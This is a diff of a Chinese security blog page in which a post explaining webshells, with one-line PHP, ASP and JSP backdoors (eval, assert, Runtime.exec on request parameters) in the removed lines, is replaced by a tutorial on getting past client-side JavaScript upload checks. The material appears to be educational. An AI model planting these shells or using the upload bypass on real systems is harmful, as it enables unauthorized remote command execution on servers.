@@ -6,7 +6,7 @@
     
     
     
-    <title>重识Webshell | oxxk blog</title>
+    <title>前端绕过JS验证 | oxxk blog</title>
     <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
     
     <meta name="theme-color" content="#77AAFF">
@@ -39,22 +39,30 @@
 
 
     
-    <meta name="description" content="知一得二重识得三，方得永恒。">
+    <meta name="description" content="绕过JS上传文件">
 <meta property="og:type" content="article">
-<meta property="og:title" content="重识Webshell">
-<meta property="og:url" content="https://0xxk.github.io/2019/09/11/重识Webshell/index.html">
+<meta property="og:title" content="前端绕过JS验证">
+<meta property="og:url" content="https://0xxk.github.io/2019/09/11/绕过JS验证后缀/index.html">
 <meta property="og:site_name" content="oxxk blog">
-<meta property="og:description" content="知一得二重识得三，方得永恒。">
+<meta property="og:description" content="绕过JS上传文件">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://0xxk.github.io/images/%E9%87%8D%E8%AF%86webshell-1.png">
-<meta property="og:image" content="https://0xxk.github.io/images/重识webshell-2.png">
-<meta property="og:image" content="https://0xxk.github.io/images/重识webshell-3.png">
-<meta property="og:image" content="https://0xxk.github.io/images/重识webshell-4.png">
-<meta property="og:updated_time" content="2019-09-11T10:29:16.522Z">
+<meta property="og:image" content="https://0xxk.github.io/images/绕过JS-1.png">
+<meta property="og:image" content="https://0xxk.github.io/images/绕过JS-2.png">
+<meta property="og:image" content="https://0xxk.github.io/images/绕过JS-3.png">
+<meta property="og:image" content="https://0xxk.github.io/images/绕过JS-4.png">
+<meta property="og:image" content="https://0xxk.github.io/images/绕过JS-5.png">
+<meta property="og:image" content="https://0xxk.github.io/images/绕过JS-6.png">
+<meta property="og:image" content="https://0xxk.github.io/images/绕过JS-7.png">
+<meta property="og:image" content="https://0xxk.github.io/images/绕过JS-8.png">
+<meta property="og:image" content="https://0xxk.github.io/images/绕过JS-9.png">
+<meta property="og:image" content="https://0xxk.github.io/images/绕过JS-10.png">
+<meta property="og:image" content="https://0xxk.github.io/images/绕过JS-11.png">
+<meta property="og:image" content="https://0xxk.github.io/images/绕过JS-12.png">
+<meta property="og:updated_time" content="2019-09-11T12:38:25.280Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="重识Webshell">
-<meta name="twitter:description" content="知一得二重识得三，方得永恒。">
-<meta name="twitter:image" content="https://0xxk.github.io/images/%E9%87%8D%E8%AF%86webshell-1.png">
+<meta name="twitter:title" content="前端绕过JS验证">
+<meta name="twitter:description" content="绕过JS上传文件">
+<meta name="twitter:image" content="https://0xxk.github.io/images/绕过JS-1.png">
     
         <link rel="alternate" type="application/atom+xml" title="oxxk blog" href="/atom.xml">
     
@@ -148,7 +156,7 @@
         <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
           <i class="icon icon-lg icon-navicon"></i>
         </a>
-        <div class="flex-col header-title ellipsis">重识Webshell</div>
+        <div class="flex-col header-title ellipsis">前端绕过JS验证</div>
         
         <div class="search-wrap" id="search-wrap">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
@@ -188,19 +196,19 @@
     <aside class="post-widget">
         <nav class="post-toc-wrap" id="post-toc">
             <h4>TOC</h4>
-            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Webshell定义"><span class="post-toc-number">1.</span> <span class="post-toc-text">Webshell定义</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#通常包括以下三种主要功能"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">通常包括以下三种主要功能</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#根据功能丰富程度来分类"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">根据功能丰富程度来分类</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#经典一句话木马"><span class="post-toc-number">2.</span> <span class="post-toc-text">经典一句话木马</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#细节知识点"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">细节知识点</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#常见网站组成"><span class="post-toc-number">3.</span> <span class="post-toc-text">常见网站组成</span></a></li></ol>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#三种绕过JS的方法"><span class="post-toc-number">1.</span> <span class="post-toc-text">三种绕过JS的方法</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#浏览器全局禁用JS"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">浏览器全局禁用JS</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#删除程序监听函数"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">删除程序监听函数</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Burp抓包修改"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">Burp抓包修改</span></a></li></ol></li></ol>
         </nav>
     </aside>
    
-<article id="post-重识Webshell"
+<article id="post-绕过JS验证后缀"
   class="post-article article-type-post fade" itemprop="blogPost">
 
     <div class="post-card">
-        <h1 class="post-card-title">重识Webshell</h1>
+        <h1 class="post-card-title">前端绕过JS验证</h1>
         <div class="post-meta">
             <i class="icon icon-lg icon-calendar-o"></i>
             发表于
-            <time class="post-time" title="2019-09-11 17:57:07" datetime="2019-09-11T09:57:07.230Z"  itemprop="datePublished">2019-09-11</time>
+            <time class="post-time" title="2019-09-11 20:12:46" datetime="2019-09-11T12:12:46.036Z"  itemprop="datePublished">2019-09-11</time>
 
             <br id="mybreak"/>
             
@@ -219,72 +227,122 @@
         </div>
         <div class="post-count-custom">
             <i class="icon icon-lg icon-comment-o"></i>
-            阅读本文可能花费您&nbsp;<span class="post-count">3</span>&nbsp;分钟
+            阅读本文可能花费您&nbsp;<span class="post-count">1</span>&nbsp;分钟
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
-            <p>知一得二重识得三，方得永恒。</p>
+            <p>绕过JS上传文件</p>
 <a id="more"></a>
 
-<h2 id="Webshell定义"><a href="#Webshell定义" class="headerlink" title="Webshell定义"></a>Webshell定义</h2><p>Webshell，网站的shell。通过shell管理操作系统，shell是用户和内核交互的程序。通常来说就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，可以称其作为网站后门。</p>
-<h3 id="通常包括以下三种主要功能"><a href="#通常包括以下三种主要功能" class="headerlink" title="通常包括以下三种主要功能"></a>通常包括以下三种主要功能</h3><p>文件管理<br>命令执行<br>管理数据库 </p>
-<h3 id="根据功能丰富程度来分类"><a href="#根据功能丰富程度来分类" class="headerlink" title="根据功能丰富程度来分类"></a>根据功能丰富程度来分类</h3><p>大马    功能更加全面<br>小马    功能单一<br>一句话木马    功能由刀来决定</p>
-<blockquote>
-<p>在jsp的网站中，马执行系统命令的偏多</p>
-</blockquote>
-<h2 id="经典一句话木马"><a href="#经典一句话木马" class="headerlink" title="经典一句话木马"></a>经典一句话木马</h2><p>PHP</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'pass'</span>]);<span class="meta">?&gt;</span>	 $_POST	==&gt;	$_REQUEST(可转换)</span><br><span class="line"><span class="meta">&lt;?php</span> assert($_POST[<span class="string">'pass'</span>]);<span class="meta">?&gt;</span>	 $_POST	==&gt;	$_REQUEST(可转换)</span><br><span class="line"><span class="meta">&lt;?php</span> preg_math(<span class="string">'/123/e'</span>,$_POST[<span class="string">'pass'</span>],<span class="string">'123456'</span>);<span class="meta">?&gt;</span>	正则匹配/e模式</span><br></pre></td></tr></table></figure>
-
-<p>ASP</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request(&quot;pass&quot;)%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这里只能使用双引号，单引号在asp中是注释</p>
-<p>JSP</p>
-<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(<span class="string">"cmd"</span>));%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>在这里通常不用GET接受，因为会留下日志且可能会与其他接受参数冲突</p>
-<h3 id="细节知识点"><a href="#细节知识点" class="headerlink" title="细节知识点"></a>细节知识点</h3><p>1.<strong>aspx</strong> Webshell的权限比asp的高。因为Aspx用由C#编写的，aspx不通过iis去运行aspx，而是通过C#去执行，因此aspx的权限就是C#运行者的权限(一般情况都比iis高)</p>
-<p>2.<strong>JSP</strong>的网站拿到权限之后一般都是root admin，这是为什么呢？因为JSP的中间件从网上下载下来后直接解压缩就行了，所有权限是当前运行者权限。而类似于apache的权限是由yum或其他命令逐步安装的 ，在安装后apache等中间件会自动创建一个中间件服务帐号。所以权限都不高，而JSP大多数都是root权限（管理员粗心）</p>
-<p>3.因为JAVA不同版本写的文件管理功能不通用，所以导致无论是大马、小马还是一句话木马，百分之80的木马文件管理功能用不了。</p>
-<h2 id="常见网站组成"><a href="#常见网站组成" class="headerlink" title="常见网站组成"></a>常见网站组成</h2><p><strong>PHP</strong></p>
-<p>linux/windows + apache + mysql/oracle/mongodb/redis + php(module)</p>
-<p>linux/windows + nginx + mysql + php-fpm(fastcgi)</p>
-<p>windows + iis +mysql + php(fastcgi)</p>
-<p><strong>JSP/JSPX</strong></p>
-<p>linux/windows + tomcat/weblogic/jboss + mysql/oracle/mongodb/redis + jsp/jspx</p>
-<p><strong>ASP/ASPX</strong></p>
-<p>windows + iis + asp/aspx + mssql/access</p>
-<p>上面是常见的三大网站组成类型，当客户端进行请求时，<a href="http://www.a.com/upload/404.php" target="_blank" rel="noopener">http://www.a.com/upload/404.php</a>, 中间件(iis,apache,nginx,tomcat,weblogic)接受到请求会进行解析。中间件会解析路径以及文件名字。</p>
-<p>如果文件后缀是中间件中设置的可识别的脚本语言后缀(php,asp,jsp…)，就会调用php、net、java程序去执行相应的文件。（文件解析）如果文件后缀不是脚本语言后缀，那么就直接让客户端下载这个文件。可识别后缀在中间件中配置。 </p>
-<p><img src="/images/%E9%87%8D%E8%AF%86webshell-1.png" alt></p>
-<p>在这里是将图片下载到浏览器缓存文件中展示，而不是直接下载到本地。</p>
-<p>webshell需要放在网站设置的目录中，后缀需要是中间件可识别的脚本语言后缀。这样webshell才能正常使用。</p>
-<p>但是在这几种环境中webshell是不存在的，无法使用的。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux/Windows nginx + nodejs/go/python/rudy/...  +  mysql/sqlite/oracle</span><br></pre></td></tr></table></figure>
-
-<p>在这些网站中，你无法在URL处访问index.php或者login.php等网页。这些网页只能通过网站内部路由方式请求，去解析访问。</p>
+<h2 id="三种绕过JS的方法"><a href="#三种绕过JS的方法" class="headerlink" title="三种绕过JS的方法"></a>三种绕过JS的方法</h2><p>1.浏览器全局禁用JS</p>
+<p>2.删除程序监听函数</p>
+<p>3.Burp抓包修改</p>
+<h3 id="浏览器全局禁用JS"><a href="#浏览器全局禁用JS" class="headerlink" title="浏览器全局禁用JS"></a>浏览器全局禁用JS</h3><p>演示环境为火狐浏览器</p>
+<p>1.在浏览器位置输入about:config，点击回车键</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="\images\重识webshell-2.png" alt title>
+                    <img src="/images/绕过JS-1.png" alt title>
                 </div>
                 <div class="image-caption"></div>
             </figure>
 
-<p>我们只能访问配置允许的路径</p>
+<p>2.看到如下画面。点击确定会小心进入选择页面。</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="\images\重识webshell-3.png" alt="1568193541550" title>
+                    <img src="/images/绕过JS-2.png" alt title>
                 </div>
-                <div class="image-caption">1568193541550</div>
+                <div class="image-caption"></div>
             </figure>
 
-<p>当我们请求的网页后缀不在允许路径里且不在路由表里时，则会下载下来。</p>
-<p>exe执行文件是直接下载下来的，其他不可识别的文件可能下载到浏览器缓存文件中去。给我们的感觉就是直接把代码显示出来了。比如html代码中间件是不识别的，所以直接下来下来由浏览器显示了。而我们的PHP代码如果在html中也是没有办法被解析的，看到的也就是乱码了。</p>
+<p>3.在输入框内输入javascript:enable</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="\images\重识webshell-4.png" alt title>
+                    <img src="/images/绕过JS-3.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>4.右击javascirpt:enable，选择切换。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/绕过JS-4.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>5.这时候就全局禁用js了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/绕过JS-5.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h3 id="删除程序监听函数"><a href="#删除程序监听函数" class="headerlink" title="删除程序监听函数"></a>删除程序监听函数</h3><p>前端文件检测都是在上传表单那做的验证。有的可能只是检测，检测完之后点击上传按钮提交。但是有的检测和上传都是用JS来实现的，这时候就不能全局禁用JS了。</p>
+<p>1.找到上传点函数</p>
+<p>在这里显示不能上传.txt的文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/绕过JS-6.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/绕过JS-7.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>2.定位表单中的JS监听函数</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/绕过JS-8.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>3.将它删除就可以直接上传了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/绕过JS-9.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h3 id="Burp抓包修改"><a href="#Burp抓包修改" class="headerlink" title="Burp抓包修改"></a>Burp抓包修改</h3><p>在这里进行抓包修改即可。首先将文件后缀改为合法的.png，再在burp里修改回去即可。</p>
+<p>1.抓包</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/绕过JS-10.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>2.修改后缀</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/绕过JS-11.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>3.上传成功</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/images/绕过JS-12.png" alt title>
                 </div>
                 <div class="image-caption"></div>
             </figure>
@@ -294,12 +352,12 @@
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2019-09-11T10:29:16.522Z" itemprop="dateUpdated">2019-09-11 18:29:16</time>
+    Last updated: <time datetime="2019-09-11T12:38:25.280Z" itemprop="dateUpdated">2019-09-11 20:38:25</time>
 </span>
 
 
         
-        原文链接：<a href="/2019/09/11/重识Webshell/" target="_blank" rel="external">https://0xxk.github.io/2019/09/11/重识Webshell/</a>
+        原文链接：<a href="/2019/09/11/绕过JS验证后缀/" target="_blank" rel="external">https://0xxk.github.io/2019/09/11/绕过JS验证后缀/</a>
         
     </div>
     <footer>
@@ -329,7 +387,7 @@
 <div class="page-share" id="pageShare">
     <ul class="reset share-icons">
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://0xxk.github.io/2019/09/11/重识Webshell/&title=《重识Webshell》 — oxxk blog&pic=https://0xxk.github.io/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://0xxk.github.io/2019/09/11/绕过JS验证后缀/&title=《前端绕过JS验证》 — oxxk blog&pic=https://0xxk.github.io/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -339,22 +397,22 @@
         </a>
       </li>
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://0xxk.github.io/2019/09/11/重识Webshell/&title=《重识Webshell》 — oxxk blog&source=知一得二重识得三，方得永恒。" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://0xxk.github.io/2019/09/11/绕过JS验证后缀/&title=《前端绕过JS验证》 — oxxk blog&source=绕过JS上传文件" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
       <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://0xxk.github.io/2019/09/11/重识Webshell/" data-title=" Facebook">
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://0xxk.github.io/2019/09/11/绕过JS验证后缀/" data-title=" Facebook">
           <i class="icon icon-facebook"></i>
         </a>
       </li>
       <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《重识Webshell》 — oxxk blog&url=https://0xxk.github.io/2019/09/11/重识Webshell/&via=https://0xxk.github.io" data-title=" Twitter">
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《前端绕过JS验证》 — oxxk blog&url=https://0xxk.github.io/2019/09/11/绕过JS验证后缀/&via=https://0xxk.github.io" data-title=" Twitter">
           <i class="icon icon-twitter"></i>
         </a>
       </li>
       <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://0xxk.github.io/2019/09/11/重识Webshell/" data-title=" Google+">
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://0xxk.github.io/2019/09/11/绕过JS验证后缀/" data-title=" Google+">
           <i class="icon icon-google-plus"></i>
         </a>
       </li>
@@ -374,21 +432,13 @@
     </div>
 
     
-<nav class="post-nav flex-row flex-justify-between">
-  
-    <div class="waves-block waves-effect prev">
-      <a href="/2019/09/11/绕过JS验证后缀/" id="post-prev" class="post-nav-link">
-        <h4 class="title" >
-          上一篇：前端绕过JS验证
-        </h4>
-      </a>
-    </div>
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
   
 
   
     <div class="waves-block waves-effect next">
-      <a href="/2019/09/10/MongoDB基础知识/" id="post-next" class="post-nav-link">
-        <h4 class="title" data-hover="下一篇：MongoDB数据库从基础到删库">下一篇：MongoDB数据库从基础到删库</h4>
+      <a href="/2019/09/11/重识Webshell/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：重识Webshell">下一篇：重识Webshell</h4>
       </a>
     </div>
   
@@ -487,7 +537,7 @@
 <div class="global-share" id="globalShare">
     <ul class="reset share-icons">
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://0xxk.github.io/2019/09/11/重识Webshell/&title=《重识Webshell》 — oxxk blog&pic=https://0xxk.github.io/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://0xxk.github.io/2019/09/11/绕过JS验证后缀/&title=《前端绕过JS验证》 — oxxk blog&pic=https://0xxk.github.io/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -497,22 +547,22 @@
         </a>
       </li>
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://0xxk.github.io/2019/09/11/重识Webshell/&title=《重识Webshell》 — oxxk blog&source=知一得二重识得三，方得永恒。" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://0xxk.github.io/2019/09/11/绕过JS验证后缀/&title=《前端绕过JS验证》 — oxxk blog&source=绕过JS上传文件" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
       <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://0xxk.github.io/2019/09/11/重识Webshell/" data-title=" Facebook">
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://0xxk.github.io/2019/09/11/绕过JS验证后缀/" data-title=" Facebook">
           <i class="icon icon-facebook"></i>
         </a>
       </li>
       <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《重识Webshell》 — oxxk blog&url=https://0xxk.github.io/2019/09/11/重识Webshell/&via=https://0xxk.github.io" data-title=" Twitter">
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《前端绕过JS验证》 — oxxk blog&url=https://0xxk.github.io/2019/09/11/绕过JS验证后缀/&via=https://0xxk.github.io" data-title=" Twitter">
           <i class="icon icon-twitter"></i>
         </a>
       </li>
       <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://0xxk.github.io/2019/09/11/重识Webshell/" data-title=" Google+">
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://0xxk.github.io/2019/09/11/绕过JS验证后缀/" data-title=" Google+">
           <i class="icon icon-google-plus"></i>
         </a>
       </li>
@@ -523,7 +573,7 @@
 <div class="page-modal wx-share" id="wxShare">
     <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p class="wechatshare">扫一扫，分享到微信</p>
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACLUlEQVR42u3a22rEMAxF0fz/T6fQp0Jx5mwpGWbk7acwxGlWCkIXH0e8zt/193q1VvesnrnadTyxZMiQ8bWM/LX+XyfUGj7fJUOGjH0Y/SB7vfc61OZ7l7/LkCFDRpDe5ameDBkyZLwz4OZJ4XNpqAwZMvZh1EJn9Adgi+3xWlyGDBlfyKgNBt5z/fh8Q4YMGR/POOHKn0bvPBtLhgwZsxnXjft+uz85flEbakY5qQwZMkYwaMFZy9No0Yt/kSFDxmgGHSsm4S9v9CcfEX9cGTJkDGXkGzrIPO27Dq+giJUhQ8Y4Rq0EzYcHecKXJ6wyZMjYgUEb9J2weL2rlkrKkCFjBwZtgeWhNg+dtEgGrUAZMmSMZiQvRA9V0IHBXYMHGTJkTGI8kcZRwA0BV4YMGeMYeZu+cyyDHvOiI1IZMmTMZtAjDrVY3hkS0OfIkCFjKiMfAOSlbCcRpAMJGTJk7MOgTTQaKJ8ofV/kuTJkyBjHyB+XN8XogKFVVMuQIWMog77QvePGKIx2/g8yZMgYxOiUozREJgkifbIMGTJmM5LkjI4V7z1UgQcDMmTIGMc44cobZJ2hJi56ZciQMZpBy9Fae44eJqMNOBkyZOzAqAVZ+kK1kSf43jJkyNiAkQdZmvxRRv6ey1pchgwZGzPyTLN2Py2biwFXhgwZ2zA6BTBNBMHhMBkyZIxm5C3+5FgGHScccL044yZDhoxxjH4vi36IWhJJBw8yZMgYwfgBlDayUG968sUAAAAASUVORK5CYII=" alt="微信分享二维码">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACJklEQVR42u3ay46DMAwF0P7/TzPbkabQaycdCXNYVZRGOSzc+PF6xdfx67q+f3bn77fJ/c0XBgbGbRnH5XW2lXyF6prXvFMqBgbGAxhnEWxl6RycBOsPe8bAwMBoUa8xvW8xMDAwrpcrLBrkm3nSi4GBgZEnnHkpLd9QjtyWi2NgYNyQ0Vv6fz5/pb+BgYFxK8b3Cvp5+3PDrjAwMEYzei3M6vjF9RZ7Qx5vdoWBgTGUUW0oJksnpbHr3ybU6H8DAwNjBCMPptVwXG0DJMfHD68YAwNjNCMpx/dGJarIlSIgBgbGVMY3xil2lerKPVgMDIwHMKobWn8+BxT+KzAwMIYy8jbArqJbrwl6+hkDA2M0oxo6q6OuveJdEkWj14eBgTGCUW1S9pqdvRGKwpERAwPjMYxdx7WVI13zAIqBgfEARt4kWAnE1dUKbQkMDIzRjF1Z7/oYWa91WjggYmBg3JbRS0eTo2S1GJcD3qyMgYExmpGHzvyZ3lhY77CIgYHxHMaud5CPhVVXiF4EBgbGwxh5KpskuitjFtuOgxgYGDdn7CriJ+Gy3J5cSV8xMDBGMI7itdJ63NUQjXwYGBiDGPlVTS/z8Jrje+1VDAyMGYxekO2lmtXGw9LMCAYGxjhGXiarHtR67cxo69XJMgwMjMcw8oS2F7iX5kQwMDAwgiPd3nENDAwMjJUkNt9utfLXHDvDwMAYzaimjiuJaPJ8FYaBgTGa8QNb7P71HGAGhgAAAABJRU5ErkJggg==" alt="微信分享二维码">
 </div>
 
 
